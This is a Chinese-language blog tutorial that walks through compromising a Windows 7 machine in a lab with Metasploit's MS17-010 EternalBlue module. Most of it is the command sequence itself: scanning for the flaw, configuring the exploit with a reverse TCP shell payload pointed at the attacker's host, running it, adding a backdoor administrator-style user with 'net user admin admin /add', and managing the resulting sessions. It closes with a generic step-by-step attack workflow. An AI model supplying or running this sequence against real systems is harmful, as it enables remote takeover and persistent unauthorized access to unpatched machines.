---
title: "使用msf渗透攻击Win7主机"
date: 2020-02-21T18:57:54+08:00
author: 姚先生
categories: ['Kali']
tags: ['安全渗透']
---

使用Metasploit渗透攻击Win7系统



<!--more-->



![](http://junmoxiao.org.cn/20200221174807.png)

* 设置Win7系统的防火墙安全策略

  ![](http://junmoxiao.org.cn/20200221191051.png)

![](http://junmoxiao.org.cn/20200221191016.png)

* 查询ms17-010漏洞的相关模块

  ~~~
  msf5 > search ms17-010
  ~~~

* 扫描目标是否存在ms17-010漏洞 

  ~~~
  use auxiliary/scanner/smb/smb_ms17_010 #查找扫描模块
  info 
  show options  #查询模块可选参数
  set RHOSTS 192.168.1.131 #设置目标主机IP
  run #扫描目标
  ~~~

  ![](http://junmoxiao.org.cn/20200221191541.png)

* 查找漏洞渗透攻击模块并执行渗透攻击

~~~
search ms17-010  #查找攻击模块
use exploit/windows/smb/ms17_010_eternalblue #使用use命令加载模块
show options  #查询模块可选参数
set RHOSTS 192.168.1.131 #设置目标主机IP
show targets #查看exploit target目标类型
set target 
search /windows/x64/shell type:payload #找一个payload，获取shell远程连接权限后，进行远程执行命令
set payload windows/x64/shell/reverse_tcp #设置payload后门,获取shell远程连接
show options
set LHOST 192.168.1.130 #设置payload参数
show options
run #执行渗透攻击
~~~

![](http://junmoxiao.org.cn/20200221192812.png)

* 执行远程命令

  ~~~
  net user admin admin /add
  chcp 65001
  net user
  whoami
  ~~~

  

* 通过会话进行连接目标机并后台运行

  ~~~
  exploit -j
  sessions 
  sessions -i ID #通过会话Id进入会话 
  background #退出会话将会话保存到后台
  sessions -k ID #根据会话Id结束会话
  ~~~

  

## Metasploit渗透攻击流程

1、查找CVE公布的漏洞 

2、查找对应的exploit\auxiliary模块 

3、查询配置模块参数 

4、添加payload后门 并配置模块参数

5、执行exploit开始攻击

6、通过会话进行连接目标机并执行命令

7、后台运行会话和结束会话